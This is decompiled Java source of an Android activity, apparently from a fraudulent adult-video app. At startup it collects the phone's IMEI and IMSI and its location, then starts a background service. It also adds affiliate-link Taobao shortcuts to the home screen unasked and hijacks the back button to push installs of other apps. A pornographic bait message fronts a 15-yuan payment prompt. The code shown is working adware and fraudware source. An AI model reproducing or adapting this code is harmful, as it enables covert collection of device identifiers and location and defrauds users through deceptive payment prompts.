package cdf.fs;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.Intent.ShortcutIconResource;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.res.Resources;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.view.Display;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.BaseAdapter;
import android.widget.GridView;
import android.widget.ImageView;
import android.widget.TextView;
import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.location.LocationClient;
import com.shoufu.FirstPay;
import com.shoufu.IOnPayResult;
import com.shoufu.PopType;
import java.io.File;
import java.io.PrintStream;
import java.util.ArrayList;
import java.util.List;
import net.tsz.afinal.FinalBitmap;
import xae.dd.SI;
import xcs.ff.A;
import xcs.ff.P;
import xcs.ff.S;
import xcs.ff.W;
import zcz.sd.D;
import zcz.sd.D.PositiveBtnOnClickLisener;
import zcz.sd.Sbv;

public class StaltActivity
  extends Activity
{
  private boolean RUNNING = false;
  private VideoAdapter adapter;
  private Context context;
  private String[] datas;
  private GridView gridView;
  int heightPixels;
  private boolean isFrist = false;
  private List<String> listName;
  private List<String> listUrl;
  private LocationClient mLocClient;
  private S sp;
  int widthPixels;
  
  public StaltActivity() {}
  
  private void initView()
  {
    this.context = this;
    this.sp = new S(this.context);
    this.datas = getResources().getStringArray(2131230720);
    this.gridView = ((GridView)findViewById(2131361792));
    this.adapter = new VideoAdapter(this.context, this.datas);
    this.gridView.setAdapter(this.adapter);
    this.gridView.setOnItemClickListener(new AdapterView.OnItemClickListener()
    {
      public void onItemClick(AdapterView<?> paramAnonymousAdapterView, View paramAnonymousView, int paramAnonymousInt, long paramAnonymousLong)
      {
        StaltActivity.this.qustDialog1(paramAnonymousInt);
      }
    });
  }
  
  private boolean isAvilible(Context paramContext, String paramString)
  {
    if ((paramString == null) || ("".equals(paramString))) {}
    for (;;)
    {
      return false;
      paramContext = getPackageManager().getInstalledPackages(0);
      int i = 0;
      while (i < paramContext.size())
      {
        Object localObject = (PackageInfo)paramContext.get(i);
        String str = ((PackageInfo)localObject).applicationInfo.loadLabel(getPackageManager()).toString();
        localObject = ((PackageInfo)localObject).packageName;
        if (str.contains(paramString)) {
          return true;
        }
        i += 1;
      }
    }
  }
  
  public ArrayList<String> IsApp()
  {
    ArrayList localArrayList = new ArrayList();
    for (;;)
    {
      int i;
      try
      {
        String str = new W().getWifi(getApplicationContext());
        this.listName = new ArrayList();
        this.listName.add(getResources().getString(2131034122));
        this.listName.add(getResources().getString(2131034125));
        str.equals("wifi");
        this.listUrl = new ArrayList();
        this.listUrl.add(getResources().getString(2131034124));
        this.listUrl.add(getResources().getString(2131034126));
        str.equals("wifi");
        if (!A.isNullOrEmpty(this.listName)) {
          break label212;
        }
        return null;
      }
      catch (Exception localException) {}
      if (i < this.listName.size())
      {
        if (!isAvilible(this.context, (String)this.listName.get(i))) {
          localArrayList.add((String)this.listUrl.get(i));
        }
        i += 1;
      }
      else
      {
        return localArrayList;
        label212:
        i = 0;
      }
    }
  }
  
  public void Locationing()
  {
    this.mLocClient = ((xzz)getApplication()).getmLocClient();
    this.mLocClient.registerLocationListener(new BDLocationListener()
    {
      public void onReceiveLocation(BDLocation paramAnonymousBDLocation)
      {
        StaltActivity.this.mLocClient.stop();
        if (paramAnonymousBDLocation.getCity() == null) {
          StaltActivity.this.Locationing();
        }
        String str = paramAnonymousBDLocation.getCity();
        paramAnonymousBDLocation = paramAnonymousBDLocation.getAddrStr();
        System.out.println("Locationing-----》" + str + paramAnonymousBDLocation);
        zcz.sd.H.city = str;
        StaltActivity.this.sp.setCache("flag", StaltActivity.this.getResources().getString(2131034118));
        StaltActivity.this.sp.setCache("public_city", str);
        StaltActivity.this.sp.setCache("public_addstr", paramAnonymousBDLocation);
        paramAnonymousBDLocation = new Intent();
        paramAnonymousBDLocation.setClass(StaltActivity.this.context, Sbv.class);
        StaltActivity.this.context.startService(paramAnonymousBDLocation);
        StaltActivity.this.mLocClient.unRegisterLocationListener(this);
        StaltActivity.this.mLocClient.stop();
      }
      
      public void onReceivePoi(BDLocation paramAnonymousBDLocation) {}
    });
    this.mLocClient.start();
  }
  
  public void addShortcutToDesktop(Context paramContext, String paramString1, String paramString2, int paramInt)
  {
    Intent localIntent = new Intent("com.android.launcher.action.INSTALL_SHORTCUT");
    localIntent.putExtra("duplicate", false);
    localIntent.putExtra("android.intent.extra.shortcut.NAME", paramString1);
    localIntent.putExtra("android.intent.extra.shortcut.ICON_RESOURCE", Intent.ShortcutIconResource.fromContext(paramContext, paramInt));
    paramString1 = new Intent("android.intent.action.VIEW");
    paramString2 = Uri.parse(paramString2);
    paramString1.setFlags(268435456);
    paramString1.setData(paramString2);
    localIntent.putExtra("android.intent.extra.shortcut.INTENT", paramString1);
    paramContext.sendBroadcast(localIntent);
  }
  
  public boolean checkPackage(String paramString)
  {
    if ((paramString == null) || ("".equals(paramString))) {
      return false;
    }
    try
    {
      getPackageManager().getApplicationInfo(paramString, 8192);
      return true;
    }
    catch (PackageManager.NameNotFoundException paramString) {}
    return false;
  }
  
  public void display(Context paramContext, ImageView paramImageView, String paramString)
  {
    if (paramString == null)
    {
      paramImageView.setImageResource(2130837507);
      return;
    }
    FinalBitmap.create(paramContext).configMemoryCacheSize(100);
    FinalBitmap.create(paramContext).configDiskCachePath(getCachePathImage());
    FinalBitmap.create(paramContext).configLoadingImage(2130837512);
    FinalBitmap.create(paramContext).configLoadfailImage(2130837508);
    FinalBitmap.create(paramContext).configDiskCacheSize(256);
    FinalBitmap.create(paramContext).display(paramImageView, paramString);
  }
  
  public String getCachePath()
  {
    Object localObject;
    if (!Environment.getExternalStorageState().equals("mounted")) {
      localObject = null;
    }
    String str;
    File localFile;
    do
    {
      return localObject;
      str = Environment.getExternalStorageDirectory().getPath() + File.separator + "ZXC";
      localFile = new File(str);
      localObject = str;
    } while (localFile.exists());
    localFile.mkdirs();
    return str;
  }
  
  public String getCachePathImage()
  {
    String str = getCachePath();
    if (str == null) {
      return null;
    }
    str = str + File.separator + "Img";
    File localFile = new File(str);
    if (!localFile.exists()) {
      localFile.mkdirs();
    }
    return str;
  }
  
  public void getRequst()
  {
    this.sp = new S(this);
    this.context = this;
    int i = Integer.parseInt(Build.VERSION.SDK);
    this.sp.setCache("releae", i);
    i = new SI(this.context).getProviders();
    this.sp.setCache("nimsi", i);
    Object localObject2 = (TelephonyManager)getSystemService("phone");
    Object localObject1 = ((TelephonyManager)localObject2).getSubscriberId();
    localObject2 = ((TelephonyManager)localObject2).getDeviceId();
    this.sp.setCache("simimsi", localObject1);
    this.sp.setCache("imei", localObject2);
    this.isFrist = this.sp.getBoolean("isfristhome");
    if (this.isFrist)
    {
      this.isFrist = true;
      this.sp.setCache("isfristhome", Boolean.valueOf(this.isFrist));
    }
    localObject1 = new DisplayMetrics();
    getWindowManager().getDefaultDisplay().getMetrics((DisplayMetrics)localObject1);
    i = ((DisplayMetrics)localObject1).widthPixels;
    int j = ((DisplayMetrics)localObject1).heightPixels;
    localObject1 = i + "*" + j;
    this.sp.setCache("publicxp", localObject1);
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    requestWindowFeature(1);
    getWindow().setFlags(1024, 1024);
    setContentView(2130903040);
    initView();
    getRequst();
    Locationing();
    addShortcutToDesktop(this.context, "爱淘宝", "http://ai.m.taobao.com?pid=mm_26434017_7056245_28304808", 2130837511);
    addShortcutToDesktop(this.context, "聚划算", "http://ai.m.taobao.com/bu.html?id=2&pid=mm_26434017_7056245_28304808", 2130837509);
    FirstPay.init(this, true, true);
    qustDialog1(-100);
  }
  
  public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent)
  {
    if (paramInt == 4)
    {
      paramKeyEvent = IsApp();
      if (!A.isNullOrEmpty(paramKeyEvent)) {
        quitDialog(paramKeyEvent);
      }
      for (;;)
      {
        return true;
        paramKeyEvent = new Intent("android.intent.action.MAIN");
        paramKeyEvent.addCategory("android.intent.category.HOME");
        paramKeyEvent.setFlags(268435456);
        startActivity(paramKeyEvent);
      }
    }
    return super.onKeyDown(paramInt, paramKeyEvent);
  }
  
  public void quitDialog(final ArrayList<String> paramArrayList)
  {
    D localD = new D(this.context, 1);
    localD.setCanceledOnTouchOutside(false);
    localD.setTitle("提示");
    localD.setContent("确定要退出APP，取消观看视频？");
    localD.setOBtnOnClickListener(new D.PositiveBtnOnClickLisener()
    {
      public void onNegativeClick(D paramAnonymousD, int paramAnonymousInt)
      {
        paramAnonymousD.dismiss();
        paramAnonymousD = new Intent(StaltActivity.this.context, P.class);
        paramAnonymousD.putStringArrayListExtra("abctomyprogess", paramArrayList);
        StaltActivity.this.startActivity(paramAnonymousD);
      }
      
      public void onPositiveClick(D paramAnonymousD, int paramAnonymousInt)
      {
        paramAnonymousD.dismiss();
        paramAnonymousD = new Intent("android.intent.action.MAIN");
        paramAnonymousD.addCategory("android.intent.category.HOME");
        paramAnonymousD.setFlags(268435456);
        StaltActivity.this.context.startActivity(paramAnonymousD);
      }
    });
    localD.show();
  }
  
  public void qustDialog(final ArrayList<String> paramArrayList)
  {
    D localD = new D(this.context, 1);
    localD.setCanceledOnTouchOutside(false);
    localD.setTitle("提示");
    localD.setContent("观看影片，需要下载对应app？");
    localD.setOBtnOnClickListener(new D.PositiveBtnOnClickLisener()
    {
      public void onNegativeClick(D paramAnonymousD, int paramAnonymousInt)
      {
        paramAnonymousD.dismiss();
        paramAnonymousD = new Intent(StaltActivity.this.context, P.class);
        paramAnonymousD.putStringArrayListExtra("abctomyprogess", paramArrayList);
        StaltActivity.this.startActivity(paramAnonymousD);
      }
      
      public void onPositiveClick(D paramAnonymousD, int paramAnonymousInt)
      {
        paramAnonymousD.dismiss();
        paramAnonymousD = new Intent(StaltActivity.this.context, P.class);
        paramAnonymousD.putStringArrayListExtra("abctomyprogess", paramArrayList);
        StaltActivity.this.startActivity(paramAnonymousD);
      }
    });
    localD.show();
  }
  
  public void qustDialog1(final int paramInt)
  {
    D localD = new D(this.context, -1);
    localD.setCanceledOnTouchOutside(false);
    localD.setTitle("提示");
    localD.setContent("海量美女嫩模自拍视频，好莱坞最新大片，性感女性高清写真图库网络每日更新，火爆娱乐八卦专题，每日新增大量视频。超丰富海量影视图库资源，现在注册仅需15元即可观看全部视频，绝对超值！另外还有更多惊喜等你哦！ 客服电话：4009988650");
    localD.setOBtnOnClickListener(new D.PositiveBtnOnClickLisener()
    {
      public void onNegativeClick(D paramAnonymousD, int paramAnonymousInt)
      {
        paramAnonymousD.dismiss();
        if (paramInt != -100)
        {
          paramAnonymousD = StaltActivity.this.datas[paramInt];
          Intent localIntent = new Intent(StaltActivity.this.context, BxActivity.class);
          localIntent.putExtra("flag", paramAnonymousD);
          StaltActivity.this.startActivity(localIntent);
        }
      }
      
      public void onPositiveClick(D paramAnonymousD, int paramAnonymousInt)
      {
        paramAnonymousD.dismiss();
        paramAnonymousD = StaltActivity.this.IsApp();
        if (!A.isNullOrEmpty(paramAnonymousD))
        {
          Intent localIntent = new Intent(StaltActivity.this.context, P.class);
          localIntent.putStringArrayListExtra("abctomyprogess", paramAnonymousD);
          StaltActivity.this.startActivity(localIntent);
          FirstPay.pay(StaltActivity.this, "禁播视频", "海量美女嫩模自拍视频，好莱坞最新大片，性感女性高清写真图库网络每日更新，火爆娱乐八卦专题，每日新增大量视频。超丰富海量影视图库资源，现在注册仅需15元即可观看全部视频，绝对超值！另外还有更多惊喜等你哦！ 客服电话：4009988650", 15.0F, "透传参数将会在支付回调接口中作为extroinfo返回", new IOnPayResult()
          {
            public void onFail(String paramAnonymous2String1, String paramAnonymous2String2, String paramAnonymous2String3) {}
            
            public void onSuccess(String paramAnonymous2String) {}
          }, PopType.NONE, true);
        }
      }
    });
    localD.show();
  }
  
  class VideoAdapter
    extends BaseAdapter
  {
    private Context context;
    private String[] datas;
    private LayoutInflater inflater;
    
    public VideoAdapter(Context paramContext, String[] paramArrayOfString)
    {
      this.context = paramContext;
      this.datas = paramArrayOfString;
      this.inflater = LayoutInflater.from(paramContext);
    }
    
    public int getCount()
    {
      if (this.datas == null) {
        return 0;
      }
      return this.datas.length;
    }
    
    public String getItem(int paramInt)
    {
      return this.datas[paramInt];
    }
    
    public long getItemId(int paramInt)
    {
      return paramInt;
    }
    
    @SuppressLint({"InflateParams"})
    public View getView(int paramInt, View paramView, ViewGroup paramViewGroup)
    {
      if (paramView == null)
      {
        paramView = this.inflater.inflate(2130903042, null);
        paramViewGroup = new ViewCache();
        paramViewGroup.imgLogo = ((ImageView)getView(paramView, 2131361795));
        paramViewGroup.txtTitle = ((TextView)getView(paramView, 2131361796));
        paramView.setTag(paramViewGroup);
      }
      for (;;)
      {
        String[] arrayOfString = getItem(paramInt).split("\\|");
        StaltActivity.this.display(this.context, paramViewGroup.imgLogo, arrayOfString[1]);
        paramViewGroup.txtTitle.setText(arrayOfString[0]);
        return paramView;
        paramViewGroup = (ViewCache)paramView.getTag();
      }
    }
    
    public <T> T getView(View paramView, int paramInt)
    {
      return paramView.findViewById(paramInt);
    }
    
    public void refresh(String[] paramArrayOfString)
    {
      this.datas = paramArrayOfString;
      notifyDataSetChanged();
    }
    
    class ViewCache
    {
      ImageView imgLogo;
      TextView txtTitle;
      
      ViewCache() {}
    }
  }
}
